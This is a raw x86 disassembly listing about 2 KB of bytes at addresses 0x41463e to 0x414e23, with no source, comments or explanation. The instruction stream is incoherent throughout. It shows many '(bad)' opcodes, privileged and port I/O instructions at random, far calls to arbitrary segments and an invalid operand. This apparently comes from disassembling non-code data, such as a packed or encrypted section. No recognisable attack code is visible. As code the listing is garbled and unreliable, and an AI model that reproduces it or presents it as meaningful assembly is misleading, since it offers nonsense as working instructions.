  41463e:	cs sbb bh,dh
  414641:	dec    eax
  414642:	and    esp,DWORD PTR [ecx]
  414644:	fidivr WORD PTR ss:[ebp-0x1f]
  414648:	sub    al,BYTE PTR [ebx-0x1ec12ea4]
  41464e:	mov    ss,WORD PTR [ecx]
  414650:	inc    esp
  414651:	outs   dx,DWORD PTR ds:[esi]
  414652:	jp     0x41467a
  414654:	jge    0x414649
  414656:	ss dec esp
  414658:	jle    0x414669
  41465a:	(bad)  
  41465b:	fst    DWORD PTR [ecx]
  41465d:	push   es
  41465e:	shl    DWORD PTR [ebx-0x5f],cl
  414661:	or     al,0x99
  414663:	sahf   
  414664:	in     al,0x3d
  414666:	push   ecx
  414667:	aad    0xe1
  414669:	(bad)  
  41466a:	cmp    ah,BYTE PTR [ebx-0x14]
  41466d:	rol    BYTE PTR [ecx],1
  41466f:	lock jle 0x41466c
  414672:	pop    es
  414673:	stos   DWORD PTR es:[edi],eax
  414674:	xchg   edi,eax
  414675:	call   FWORD PTR [ecx-0xf791ba4]
  41467b:	pop    ebp
  41467c:	sbb    al,0xcf
  41467e:	aaa    
  41467f:	adc    al,0xea
  414681:	push   0xfffffff8
  414683:	mov    esi,0x2948304
  414688:	ss int 0xb2
  41468b:	je     0x4146d1
  41468d:	xchg   ebp,eax
  41468e:	mov    al,ds:0x7685fa2d
  414693:	xor    al,0x58
  414695:	jmp    DWORD PTR [eax]
  414697:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414698:	pop    eax
  414699:	rcr    BYTE PTR [edx+0x72],1
  41469c:	loop   0x414652
  41469e:	jns    0x414620
  4146a0:	bound  ecx,QWORD PTR [eax+0x6d4ea768]
  4146a6:	dec    ebx
  4146a7:	ret    
  4146a8:	(bad)  
  4146a9:	fcmovnu st,st(4)
  4146ab:	lods   eax,DWORD PTR ds:[esi]
  4146ac:	jmp    0x7448:0xf7a6dcb9
  4146b3:	arpl   WORD PTR [ebx],si
  4146b5:	inc    ecx
  4146b6:	shl    BYTE PTR [ebp+0x7b],1
  4146b9:	cmp    al,0x9f
  4146bb:	enter  0xd304,0xcc
  4146bf:	ficom  WORD PTR [edi-0x6a341080]
  4146c5:	dec    ecx
  4146c6:	jno    0x4146eb
  4146c8:	popa   
  4146c9:	sub    dl,BYTE PTR [edi+0x12]
  4146cc:	(bad)  
  4146cd:	(bad)  
  4146cf:	mov    ss,WORD PTR [eax]
  4146d1:	sub    bl,dl
  4146d3:	xchg   esp,eax
  4146d4:	inc    esp
  4146d5:	and    bh,BYTE PTR [ebp-0x60a71cf8]
  4146db:	sbb    eax,0x8f2b7299
  4146e0:	xchg   BYTE PTR [esi],bl
  4146e2:	add    DWORD PTR [edi-0x9],0xfffffff3
  4146e6:	adc    edx,eax
  4146e8:	sbb    edi,DWORD PTR [ebp-0x6c6a56a6]
  4146ee:	out    0xf3,al
  4146f0:	ins    DWORD PTR es:[edi],dx
  4146f1:	dec    eax
  4146f2:	es leave 
  4146f4:	jae    0x41472f
  4146f6:	imul   edx,esp,0x8deb79c7
  4146fc:	xor    dh,bl
  4146fe:	mov    eax,0x40ed912
  414703:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414704:	fidivr DWORD PTR [eax-0x2a]
  414707:	cmp    bl,BYTE PTR [esi-0x19b814b9]
  41470d:	xchg   ebx,eax
  41470e:	dec    eax
  41470f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414710:	sub    eax,0x581fa90d
  414715:	(bad)  
  414716:	fstp   TBYTE PTR [edx]
  414718:	xor    eax,0x57c953c9
  41471d:	push   edx
  41471e:	in     eax,0xb1
  414720:	pop    esp
  414721:	aam    0x36
  414723:	loope  0x414729
  414725:	xchg   ebp,eax
  414726:	aam    0xa4
  414728:	fwait
  414729:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41472a:	loop   0x41474f
  41472c:	pushf  
  41472d:	pop    esp
  41472e:	aad    0x4d
  414730:	xlat   BYTE PTR ds:[ebx]
  414731:	or     ebx,eax
  414733:	and    BYTE PTR fs:[ecx+0x42491897],0xec
  41473b:	ds xchg edx,eax
  41473d:	outs   dx,DWORD PTR ds:[esi]
  41473e:	or     al,0x97
  414740:	imul   ecx,esi,0xffffff95
  414743:	fs mov dl,ah
  414746:	fst    QWORD PTR [esi+ebx*2-0x65]
  41474a:	mov    dl,dh
  41474c:	fwait
  41474d:	test   BYTE PTR [edx],bl
  41474f:	dec    eax
  414750:	ins    DWORD PTR es:[edi],dx
  414751:	dec    edi
  414752:	in     eax,dx
  414753:	mov    al,0x4a
  414755:	xchg   ebp,eax
  414756:	fimul  WORD PTR [eax]
  414758:	or     eax,0x41b88c89
  41475d:	push   ecx
  41475e:	ins    BYTE PTR es:[edi],dx
  41475f:	mov    ch,ch
  414761:	xchg   ebp,eax
  414762:	out    0x22,eax
  414764:	mov    DWORD PTR [ebx-0x155f2f80],ebx
  41476a:	(bad)  
  41476b:	popa   
  41476c:	scas   eax,DWORD PTR es:[edi]
  41476d:	cld    
  41476e:	jnp    0x4147c9
  414770:	lahf   
  414771:	ja     0x414720
  414773:	dec    esp
  414774:	and    al,0xe
  414776:	sbb    BYTE PTR [edi+0x4648f660],ch
  41477c:	dec    esi
  41477d:	lods   eax,DWORD PTR ds:[esi]
  41477e:	cmp    dl,bl
  414780:	ds ds push ecx
  414783:	ds cld 
  414785:	mov    cl,BYTE PTR [esi]
  414787:	or     al,BYTE PTR [ebp-0x38]
  41478a:	xchg   ebx,eax
  41478b:	sbb    dh,BYTE PTR [esi]
  41478d:	popf   
  41478e:	out    dx,al
  41478f:	pop    esp
  414790:	call   0xb190c5bb
  414795:	ret    
  414796:	(bad)  
  414797:	std    
  414798:	outs   dx,DWORD PTR ds:[esi]
  414799:	lea    esi,[ebx-0x207210c5]
  41479f:	jb     0x41480a
  4147a1:	and    BYTE PTR [edx+0x67],bl
  4147a4:	jno    0x41478a
  4147a6:	add    ch,BYTE PTR [edi]
  4147a8:	adc    BYTE PTR [edi-0x14e62817],0x74
  4147af:	retf   
  4147b0:	jne    0x4147d4
  4147b2:	pushf  
  4147b3:	mov    WORD PTR [ebx+ebx*1],gs
  4147b6:	xor    cl,0x67
  4147b9:	pop    eax
  4147ba:	jb     0x414807
  4147bc:	sti    
  4147bd:	xor    DWORD PTR [ecx+edx*8],0xab8b0df9
  4147c4:	push   ss
  4147c5:	ja     0x4147b1
  4147c7:	mov    ebx,0xb3e5b9b8
  4147cc:	inc    ecx
  4147cd:	sub    BYTE PTR ss:[esi+0x7e97ec87],al
  4147d4:	mov    dl,0x3b
  4147d6:	sub    eax,0xc9e4b7e2
  4147db:	mov    ds:0x57788a8d,al
  4147e0:	xchg   ebp,eax
  4147e1:	add    edx,DWORD PTR [edx+0x52]
  4147e4:	neg    DWORD PTR [bx+di]
  4147e7:	mov    ?,WORD PTR [esi+edx*8]
  4147ea:	mov    eax,ds:0x903bef8b
  4147ef:	jns    0x4147e2
  4147f1:	adc    BYTE PTR [esi],0x6
  4147f4:	inc    esi
  4147f5:	test   al,0x5d
  4147f7:	sub    eax,0x88b2e11a
  4147fc:	xor    BYTE PTR [esi-0x33da32fb],bl
  414802:	inc    ebp
  414803:	test   dl,0x50
  414806:	iret   
  414807:	jne    0x41482e
  414809:	ficom  DWORD PTR ds:0x60b6ce1
  41480f:	loop   0x414812
  414811:	and    BYTE PTR [edi+0x507b2868],bh
  414817:	jns    0x41482f
  414819:	sbb    BYTE PTR [ebp+0x771faf38],cl
  41481f:	pusha  
  414820:	(bad)  
  414822:	or     DWORD PTR [edx+0x26],ebx
  414825:	gs stc 
  414827:	das    
  414828:	pop    esi
  414829:	push   0xffffff8f
  41482b:	aaa    
  41482c:	inc    ebx
  41482d:	test   BYTE PTR [ecx-0x2c3be3bc],al
  414833:	sub    esp,ebp
  414835:	shl    DWORD PTR ds:0xd0e332fc,1
  41483b:	sbb    bh,ah
  41483d:	(bad)  
  41483e:	jne    0x414839
  414840:	or     al,0x8
  414842:	sub    eax,0xc4e4a9f5
  414847:	fstp   TBYTE PTR ds:0x7d0a430c
  41484d:	pop    ecx
  41484e:	push   ecx
  41484f:	lea    edi,[eax-0x723ed7e9]
  414855:	push   esp
  414856:	push   ss
  414857:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414858:	ret    0xf15a
  41485b:	inc    ebx
  41485c:	cmp    eax,0x26cd59d5
  414861:	sbb    BYTE PTR [edx+0x789ef92],al
  414867:	cs sub eax,0x1f25c0e7
  41486d:	inc    esp
  41486e:	push   ecx
  41486f:	daa    
  414870:	leave  
  414871:	push   esp
  414872:	xor    al,0x9b
  414874:	add    DWORD PTR [ebx],esp
  414876:	jle    0x414890
  414878:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414879:	lock popf 
  41487b:	push   ecx
  41487c:	sbb    al,0xd1
  41487e:	lahf   
  41487f:	xchg   ebp,eax
  414880:	dec    BYTE PTR [eax+0x1a244dd8]
  414886:	mov    bh,0x47
  414888:	fwait
  414889:	loopne 0x41480f
  41488b:	and    ebp,0xffffff9c
  41488e:	adc    eax,0xed736a18
  414893:	jb     0x41486c
  414895:	inc    esp
  414896:	pop    edi
  414897:	sbb    BYTE PTR [ebx+0x5a746803],cl
  41489d:	push   ds
  41489e:	dec    esi
  41489f:	sbb    ebx,DWORD PTR [ecx+0x47646a4]
  4148a5:	pusha  
  4148a6:	mov    ah,0x5b
  4148a8:	ror    BYTE PTR [ebx],0xfc
  4148ab:	(bad)  
  4148ac:	push   eax
  4148ad:	mov    ebx,0xdb2e93f
  4148b2:	sti    
  4148b3:	dec    edx
  4148b4:	imul   si,WORD PTR es:[edi+0x3ca8fdc3],0x31
  4148bd:	dec    edx
  4148be:	mov    esi,0xc144e557
  4148c3:	mov    dh,0xa8
  4148c5:	xchg   dl,ch
  4148c7:	and    BYTE PTR [esi+0x16],al
  4148ca:	mov    DWORD PTR [esi+0x51],edx
  4148cd:	mov    DWORD PTR [ebx-0x590e50fb],eax
  4148d3:	js     0x4148ce
  4148d5:	rcr    DWORD PTR [esi+0x12],0xf9
  4148d9:	inc    edi
  4148da:	or     eax,edx
  4148dc:	mov    DWORD PTR [ebx+ecx*8],edx
  4148df:	mov    WORD PTR [edx+0x231d0c1e],es
  4148e5:	push   ebx
  4148e6:	in     al,dx
  4148e7:	ret    0x35d6
  4148ea:	xor    bl,BYTE PTR [ecx]
  4148ec:	retf   
  4148ed:	dec    ebp
  4148ee:	int3   
  4148ef:	push   ebp
  4148f0:	(bad)  
  4148f2:	sbb    eax,0xd51e3322
  4148f7:	mov    bl,0x3c
  4148f9:	in     eax,0x1
  4148fb:	pop    es
  4148fc:	push   ecx
  4148fd:	push   esi
  4148fe:	mov    DWORD PTR [edi-0xa],0x8aed65f
  414905:	and    eax,eax
  414907:	repz xchg esi,eax
  414909:	cmp    al,0x1f
  41490b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41490c:	js     0x414926
  41490e:	dec    edx
  41490f:	cli    
  414910:	mov    ecx,0x5c96a50d
  414915:	loopne 0x4148a0
  414917:	mov    eax,0x99439e65
  41491c:	clc    
  41491d:	lods   al,BYTE PTR ds:[esi]
  41491e:	scas   al,BYTE PTR es:[edi]
  41491f:	ret    0xb4c3
  414922:	mov    ds:0x3d89154,eax
  414927:	and    bh,BYTE PTR [ecx]
  414929:	retf   
  41492a:	xchg   esi,eax
  41492c:	test   DWORD PTR [esi-0x1040477d],eax
  414932:	test   ebx,esi
  414934:	and    eax,0xae72f39f
  414939:	dec    eax
  41493a:	mov    ebp,0xabaac7ae
  41493f:	das    
  414940:	scas   al,BYTE PTR es:[edi]
  414941:	(bad)  
  414942:	clc    
  414943:	pop    es
  414944:	shl    esi,1
  414946:	test   al,0x5f
  414948:	(bad)  
  414949:	clc    
  41494a:	mov    ds:0x1687caf,eax
  41494f:	sub    DWORD PTR [ebp+0x586afc9d],esp
  414955:	add    BYTE PTR [ebx-0x3043966f],al
  41495b:	lds    ebx,FWORD PTR [eax-0x1d]
  41495e:	in     ax,0x57
  414961:	sbb    BYTE PTR [ebx-0x68d012d7],cl
  414967:	sub    ch,BYTE PTR [eax+eax*8-0x9]
  41496b:	in     eax,0x2f
  41496d:	sbb    DWORD PTR [edx+0x70],esi
  414970:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414971:	sbb    al,0xb5
  414973:	mov    ?,ebp
  414975:	cmp    eax,0x818037f4
  41497a:	sahf   
  41497b:	sbb    eax,0x619d373f
  414980:	xchg   ebp,eax
  414981:	call   0x8038:0x651525ed
  414988:	sbb    al,0x5a
  41498a:	adc    ch,BYTE PTR [eax-0x15]
  41498d:	jg     0x414929
  41498f:	cmc    
  414990:	cli    
  414991:	jp     0x4149d1
  414993:	jns    0x414926
  414995:	sti    
  414996:	fadd   QWORD PTR [eax+ecx*2]
  414999:	xor    DWORD PTR [esi+0x574bd44c],ebp
  41499f:	xchg   edi,eax
  4149a0:	mov    ah,0x9c
  4149a2:	mov    edi,DWORD PTR [esi-0x11c5e6f8]
  4149a8:	sahf   
  4149a9:	popa   
  4149aa:	adc    al,0x69
  4149ac:	fist   WORD PTR [esi]
  4149ae:	sbb    dh,BYTE PTR [esi+ebx*4]
  4149b1:	repnz loopne 0x414972
  4149b4:	test   al,0xce
  4149b6:	cmp    eax,0x42beb43d
  4149bb:	mov    WORD PTR [edx],gs
  4149bd:	das    
  4149be:	popa   
  4149bf:	mov    ebx,DWORD PTR [ebp-0x1e]
  4149c2:	call   0x2699b6da
  4149c7:	repz mov ch,0x8e
  4149ca:	jnp    0x414992
  4149cc:	loopne 0x414997
  4149ce:	adc    dl,BYTE PTR [esi-0x32]
  4149d1:	ss in  eax,0x56
  4149d4:	mov    eax,0xeff575dd
  4149d9:	test   BYTE PTR [ecx],ah
  4149db:	mov    DWORD PTR [edi-0x7fd6645f],edi
  4149e1:	leave  
  4149e2:	gs ret 
  4149e4:	dec    eax
  4149e5:	retf   
  4149e6:	ror    BYTE PTR [ebp-0x423e7475],1
  4149ec:	nop
  4149ed:	scas   al,BYTE PTR es:[edi]
  4149ee:	dec    ebp
  4149ef:	mov    eax,0x7cb1ec0b
  4149f4:	mov    dl,0x7f
  4149f6:	mov    edi,0x9935232d
  4149fb:	ficomp WORD PTR [esi+0x40dd151a]
  414a01:	cs mov bl,0x50
  414a04:	sahf   
  414a05:	adc    BYTE PTR [esp+eiz*8+0x44],al
  414a09:	jo     0x4149be
  414a0b:	mov    esi,0x922dc66d
  414a10:	jmp    0x3c6c2c24
  414a15:	xchg   ebx,eax
  414a16:	sub    DWORD PTR ds:0x7651c8b,esi
  414a1c:	push   esi
  414a1d:	sub    eax,0x8e2d6a38
  414a22:	jg     0x414a07
  414a24:	retf   0xb5aa
  414a27:	mov    ecx,0x2fc1bb6b
  414a2c:	lods   eax,DWORD PTR ds:[esi]
  414a2d:	push   edx
  414a2e:	(bad)  
  414a30:	pusha  
  414a31:	dec    ecx
  414a32:	jae    0x414a4a
  414a34:	or     DWORD PTR [ebx-0x32],0x6b
  414a38:	pop    esp
  414a39:	sub    DWORD PTR [edi+ebp*4-0x4c023028],edx
  414a40:	sub    bh,BYTE PTR [ecx+esi*2+0x23]
  414a44:	das    
  414a45:	in     al,0xec
  414a47:	stos   BYTE PTR es:[edi],al
  414a48:	xchg   ebx,eax
  414a49:	push   ebx
  414a4a:	fsubr  st(3),st
  414a4c:	cld    
  414a4d:	lea    eax,[ecx]
  414a4f:	leave  
  414a50:	cdq    
  414a51:	arpl   WORD PTR [edi],bp
  414a53:	push   cs
  414a54:	add    al,0x5e
  414a56:	push   edx
  414a57:	sub    al,0x6e
  414a59:	test   ch,bh
  414a5b:	cli    
  414a5c:	cdq    
  414a5d:	adc    BYTE PTR [esi],ch
  414a5f:	fist   WORD PTR ds:0xf5df5e26
  414a65:	pop    es
  414a66:	dec    esi
  414a67:	outs   dx,DWORD PTR ds:[esi]
  414a68:	fs mul ah
  414a6b:	mov    esp,0xa212c4fa
  414a70:	les    ebx,FWORD PTR [ecx]
  414a72:	cmp    ebx,0x656f89b0
  414a78:	cmp    DWORD PTR [esp+edi*8+0x1e],ecx
  414a7c:	mov    esp,0x76e63bc2
  414a81:	(bad)  
  414a82:	dec    esp
  414a83:	into   
  414a84:	je     0x414a56
  414a86:	aad    0xc7
  414a88:	ds (bad) 
  414a8a:	cs std 
  414a8c:	popa   
  414a8d:	cmp    al,0x8c
  414a8f:	outs   dx,BYTE PTR ds:[esi]
  414a90:	jns    0x414ad3
  414a92:	lock adc esi,DWORD PTR [esi-0x4ba7c4db]
  414a99:	xchg   ecx,eax
  414a9a:	xchg   BYTE PTR [esp+edi*4-0x61],bl
  414a9e:	retf   
  414a9f:	push   0xffffffc8
  414aa1:	cmp    al,0x3f
  414aa3:	dec    ecx
  414aa4:	mov    ecx,0xc4384d90
  414aa9:	sbb    DWORD PTR [edi],0xfffffff0
  414aac:	or     al,0x2a
  414aae:	mov    ebx,0x3530ee3e
  414ab3:	out    dx,eax
  414ab4:	gs rcr ebp,1
  414ab7:	test   al,0x90
  414ab9:	push   ds
  414aba:	aaa    
  414abb:	jne    0x414aca
  414abd:	test   eax,0x74fe7ad
  414ac2:	stos   DWORD PTR es:[edi],eax
  414ac3:	sub    al,0x3f
  414ac5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ac6:	inc    ebx
  414ac7:	lock shr DWORD PTR [ebx+0x1163e779],1
  414ace:	fadd   QWORD PTR [edx]
  414ad0:	adc    DWORD PTR [eax+0x6d],edx
  414ad3:	pop    ebx
  414ad4:	gs pop es
  414ad6:	hlt    
  414ad7:	test   ch,ch
  414ad9:	stos   DWORD PTR es:[edi],eax
  414ada:	out    dx,eax
  414adb:	iret   
  414adc:	xor    al,0xa6
  414ade:	fist   WORD PTR [eax+eax*2]
  414ae1:	or     eax,0x5ee076d9
  414ae6:	mov    edx,0xf5475045
  414aeb:	add    ecx,DWORD PTR [ebp-0x16]
  414aee:	mov    eax,ds:0x2257c476
  414af3:	xchg   esp,eax
  414af4:	xchg   esi,eax
  414af5:	sub    al,0x60
  414af7:	adc    esp,ecx
  414af9:	out    dx,al
  414afa:	mov    ecx,0x53764d26
  414aff:	jg     0x414a92
  414b01:	fisttp DWORD PTR [edi+0x4892df6a]
  414b07:	jp     0x414b0a
  414b09:	jbe    0x414b1c
  414b0b:	adc    DWORD PTR [ecx+0x4],ebp
  414b0e:	ins    BYTE PTR es:[edi],dx
  414b0f:	and    DWORD PTR [edx+0xb],eax
  414b12:	sub    eax,0x37ff36df
  414b17:	dec    eax
  414b18:	(bad)
  414b1d:	mov    al,BYTE PTR [eax+0x23fc536]
  414b23:	std    
  414b24:	xchg   BYTE PTR [edx+0x1d7222b9],ch
  414b2a:	idiv   BYTE PTR [esi+0x32]
  414b2d:	pop    ss
  414b2e:	ja     0x414b28
  414b30:	lds    ebp,FWORD PTR fs:[ebp-0x62e26dd7]
  414b37:	scas   al,BYTE PTR es:[edi]
  414b38:	mov    ch,0x92
  414b3a:	rcl    BYTE PTR ss:[ebp-0x6559832c],0xda
  414b42:	mov    al,BYTE PTR [ebp-0x3caa8454]
  414b48:	mov    bl,0x10
  414b4a:	inc    esi
  414b4b:	push   esi
  414b4c:	ss jbe 0x414b18
  414b4f:	push   ss
  414b50:	sub    eax,0xe62346e1
  414b55:	or     bl,BYTE PTR [edi-0x6a]
  414b58:	(bad)  
  414b59:	push   edx
  414b5a:	push   ss
  414b5b:	xor    DWORD PTR [ecx-0x2209808c],esi
  414b61:	adc    ah,BYTE PTR [esi+0x3]
  414b64:	push   edx
  414b65:	sbb    DWORD PTR [eax-0x67d9b9b],ebx
  414b6b:	shl    DWORD PTR [eax],0x93
  414b6e:	or     bh,BYTE PTR [edx+0x3e9d8b94]
  414b74:	fsubr  DWORD PTR [edi+0x18]
  414b77:	cs xor dh,BYTE PTR ds:[eax+0x1f01186]
  414b7f:	inc    edi
  414b80:	arpl   WORD PTR ds:0x5e67191b,sp
  414b86:	mov    dl,0xb9
  414b88:	arpl   WORD PTR [ecx+0x31],sp
  414b8b:	out    0x20,al
  414b8d:	fwait
  414b8e:	add    eax,0x53adc3c1
  414b93:	in     eax,0x38
  414b95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b96:	div    DWORD PTR [ebp-0x288e8d81]
  414b9c:	test   BYTE PTR ds:0x9606a037,dh
  414ba2:	aaa    
  414ba3:	jecxz  0x414bcb
  414ba5:	int    0x88
  414ba7:	mov    dh,0xf4
  414ba9:	mov    al,0xdb
  414bab:	div    DWORD PTR [edx-0x6f]
  414bae:	adc    BYTE PTR [esi-0x1d],cl
  414bb1:	add    BYTE PTR [ebp-0x9410de2],dh
  414bb7:	(bad)  [edx+0x4bfa73c3]
  414bbd:	ret    0x2303
  414bc0:	pop    eax
  414bc1:	cmp    edi,DWORD PTR [edx-0x952e156]
  414bc7:	into   
  414bc8:	mov    esp,0xe81a7689
  414bcd:	ret    
  414bce:	(bad)
  414bd2:	loope  0x414bcf
  414bd4:	lods   eax,DWORD PTR ds:[esi]
  414bd5:	dec    ebp
  414bd6:	pusha  
  414bd7:	call   0x3726:0x958b3005
  414bde:	call   0x11d207eb
  414be3:	lods   al,BYTE PTR ds:[esi]
  414be4:	ss and al,0x38
  414be7:	mov    ch,0xbc
  414be9:	xor    bl,BYTE PTR [edx]
  414beb:	fs cmp al,bh
  414bee:	stc    
  414bef:	or     BYTE PTR [eax],0xa1
  414bf2:	ds out dx,eax
  414bf4:	int    0x80
  414bf6:	aad    0x2c
  414bf8:	jne    0x414b98
  414bfa:	adc    cl,ah
  414bfc:	les    esi,FWORD PTR [esi]
  414bfe:	in     al,0x1
  414c00:	rcl    ch,1
  414c02:	inc    esp
  414c03:	or     al,0xe3
  414c05:	lods   al,BYTE PTR ds:[esi]
  414c06:	mov    ebp,DWORD PTR [ecx-0x17dda81a]
  414c0c:	pop    edi
  414c0d:	adc    DWORD PTR [eax+0x59a71598],0x1b
  414c14:	into   
  414c15:	sub    al,0x89
  414c17:	mov    al,0x8f
  414c19:	call   0xfb7ea236
  414c1e:	and    edi,esp
  414c20:	xchg   DWORD PTR [ebx+0x52a09335],ebp
  414c26:	adc    ch,BYTE PTR ds:0x7a00a099
  414c2c:	out    dx,al
  414c2d:	and    cl,BYTE PTR [esp+ecx*2+0x3092a51a]
  414c34:	in     eax,dx
  414c35:	jbe    0x414c0e
  414c37:	mov    ch,0x0
  414c39:	mov    al,BYTE PTR [edi]
  414c3b:	cmp    eax,0x5f88acb9
  414c40:	in     eax,dx
  414c41:	and    edi,DWORD PTR [esi]
  414c43:	inc    edx
  414c44:	adc    al,0xd9
  414c46:	inc    eax
  414c47:	test   al,0x95
  414c49:	mov    ch,0x9f
  414c4b:	and    al,0xe7
  414c4d:	mov    ds:0x828f271b,eax
  414c52:	pop    es
  414c53:	mov    edx,0x6b640073
  414c58:	ret    
  414c59:	mov    dh,0x7f
  414c5b:	cmp    BYTE PTR [ebx-0x574a9907],cl
  414c61:	jecxz  0x414c72
  414c63:	push   edx
  414c64:	push   esp
  414c65:	(bad)  
  414c66:	sti    
  414c67:	in     eax,0xaa
  414c69:	push   ebp
  414c6a:	mov    al,dl
  414c6c:	xor    al,0x1b
  414c6e:	idiv   ebx
  414c70:	loopne 0x414c6d
  414c72:	pop    ds
  414c73:	(bad)  
  414c74:	mov    ebp,0x41814c4a
  414c79:	in     eax,dx
  414c7a:	lods   eax,DWORD PTR ds:[esi]
  414c7b:	aaa    
  414c7c:	bound  edx,QWORD PTR [edi]
  414c7e:	sub    al,0xd8
  414c80:	mov    BYTE PTR [esi+edx*2],dl
  414c83:	mov    cl,0x11
  414c85:	sar    ebx,1
  414c87:	jne    0x414c0c
  414c89:	mov    edi,0x585c9cd3
  414c8e:	push   eax
  414c8f:	jp     0x414c91
  414c91:	pop    eax
  414c92:	fdiv   DWORD PTR [eax+edx*8-0x7f]
  414c96:	in     al,0x32
  414c98:	xor    DWORD PTR [ecx+0x51291d6b],ebp
  414c9e:	cmp    eax,0x744e469
  414ca3:	xchg   edx,eax
  414ca4:	imul   edi,DWORD PTR [ecx+0x405890bc],0xffffff94
  414cab:	cli    
  414cac:	xchg   BYTE PTR [ebp+0x41],ch
  414caf:	ds cmp eax,0x42ce6c93
  414cb5:	ja     0x414cd7
  414cb7:	sbb    al,0xc5
  414cb9:	jmp    0x414cd0
  414cbb:	pop    ecx
  414cbc:	adc    ah,BYTE PTR [eax]
  414cbe:	pop    edx
  414cbf:	jge    0x414cc4
  414cc1:	ret    
  414cc2:	pop    ecx
  414cc3:	mov    es,esi
  414cc5:	gs push 0xae71e5c1
  414ccb:	ins    DWORD PTR es:[edi],dx
  414ccc:	shr    BYTE PTR [edx+0x6409f0cb],0x9b
  414cd3:	mov    ch,0x32
  414cd5:	dec    ebx
  414cd6:	inc    ebx
  414cd7:	jno    0x414c9d
  414cd9:	rcr    DWORD PTR [ebp+0x77],1
  414cdc:	mov    DWORD PTR [edx+0x75],ecx
  414cdf:	sub    al,bh
  414ce1:	xchg   bh,cl
  414ce3:	loopne 0x414d53
  414ce5:	xor    eax,0x3810b2e9
  414cea:	inc    ebp
  414ceb:	(bad)  
  414cec:	je     0x414d67
  414cee:	out    dx,al
  414cef:	push   ebx
  414cf0:	pop    es
  414cf1:	mov    BYTE PTR [ebx+edi*2-0x79],ch
  414cf5:	cmp    DWORD PTR [ebx],0x68
  414cf8:	into   
  414cf9:	xor    al,0x48
  414cfb:	xor    BYTE PTR [ebp+0x11],bh
  414cfe:	enter  0xb960,0xd9
  414d02:	mov    fs,WORD PTR [eax-0x2c6b5bcb]
  414d08:	inc    ebx
  414d09:	and    ch,BYTE PTR [ebp-0x1b2a5b0b]
  414d0f:	in     al,0x35
  414d11:	mov    WORD PTR [eax+0x65],gs
  414d14:	or     ch,BYTE PTR [bx+di]
  414d17:	ins    BYTE PTR es:[edi],dx
  414d18:	mov    ds:0x1214f86,eax
  414d1d:	mov    cl,0x1b
  414d1f:	pop    ds
  414d20:	cs inc ecx
  414d22:	ds xor bl,bl
  414d25:	ror    DWORD PTR [esi+edx*8+0x6c459202],0x33
  414d2d:	(bad)  
  414d30:	fldcw  WORD PTR [esi+0x34529881]
  414d36:	mov    ah,0xc1
  414d38:	movzx  ebx,BYTE PTR [ebx-0x1905ed1]
  414d3f:	outs   dx,DWORD PTR ds:[esi]
  414d40:	inc    ebx
  414d41:	sbb    eax,0x2dfc590a
  414d46:	xchg   esi,eax
  414d47:	test   BYTE PTR cs:[ecx-0x5ec5c2e2],ah
  414d4e:	and    al,bh
  414d50:	push   ss
  414d51:	jge    0x414dc0
  414d53:	add    al,0x4c
  414d55:	loopne 0x414dbc
  414d57:	push   ds
  414d58:	push   esi
  414d59:	mov    bh,0xe0
  414d5b:	(bad)  
  414d5c:	cwde   
  414d5d:	je     0x414dc3
  414d5f:	jns    0x414d31
  414d61:	icebp  
  414d62:	xchg   esp,eax
  414d63:	mov    ds:0xaec35f52,al
  414d68:	mov    esp,0x509623d1
  414d6d:	cmp    eax,0x425d86f3
  414d72:	sbb    eax,0x3e499324
  414d77:	scas   eax,DWORD PTR es:[edi]
  414d78:	arpl   dx,dx
  414d7a:	jo     0x414dd8
  414d7c:	repnz lock pop ss
  414d7f:	(bad)  
  414d80:	push   edx
  414d81:	and    BYTE PTR [esi+0x4f819b93],ah
  414d87:	pop    ebx
  414d88:	pusha  
  414d89:	in     al,dx
  414d8a:	mov    al,0xc4
  414d8c:	dec    BYTE PTR [ebx+eiz*8+0x359e756d]
  414d93:	div    BYTE PTR [esi-0x6d]
  414d96:	je     0x414da0
  414d98:	mov    ebx,0x19277ecc
  414d9d:	jmp    0x73a98381
  414da2:	dec    esi
  414da3:	xchg   ebp,eax
  414da4:	cli    
  414da5:	mov    eax,ds:0x6bdae9dd
  414daa:	fild   QWORD PTR [eax+0x34e0aa2f]
  414db0:	imul   eax,DWORD PTR [edx-0x40],0x5098cb21
  414db7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414db8:	mov    bl,0xf4
  414dba:	ret    0xf1b1
  414dbd:	scas   al,BYTE PTR es:[edi]
  414dbe:	jmp    0x414d9b
  414dc0:	push   ds
  414dc1:	shl    ah,cl
  414dc3:	mov    esi,0xb8a0c9aa
  414dc8:	inc    ecx
  414dc9:	xor    al,0x54
  414dcb:	and    edx,DWORD PTR [eax-0x1e5cf8e]
  414dd1:	jp     0x414e4b
  414dd3:	mov    ch,BYTE PTR [esi-0x40460344]
  414dd9:	nop
  414dda:	icebp  
  414ddb:	xor    DWORD PTR [edi+0x64],esi
  414dde:	mov    bl,0xd0
  414de0:	scas   eax,DWORD PTR es:[edi]
  414de1:	cmp    BYTE PTR [edx-0x4c97a278],ah
  414de7:	mov    esi,0xf5b9e89c
  414dec:	sub    esp,edi
  414dee:	inc    ebp
  414def:	nop
  414df0:	and    ch,dl
  414df2:	outs   dx,DWORD PTR ds:[esi]
  414df3:	mov    WORD PTR [ebp+ebx*1+0x3a093eab],cs
  414dfa:	push   ecx
  414dfb:	adc    ebx,DWORD PTR [ebp-0x28]
  414dfe:	fist   DWORD PTR [edi+0x76136051]
  414e04:	mov    eax,0x36826a34
  414e09:	ins    BYTE PTR es:[edi],dx
  414e0a:	call   0xb63e:0x689c4586
  414e11:	gs cli 
  414e13:	ror    DWORD PTR [ecx+0x3],0xcf
  414e17:	mov    dl,0x24
  414e19:	jne    0x414da5
  414e1b:	(bad)  
  414e1c:	push   eax
  414e1d:	pop    ebp
  414e1e:	out    dx,al
  414e1f:	jecxz  0x414e3a
  414e21:	xor    al,0x38
  414e23:	gs sub eax,0xe23c67ed
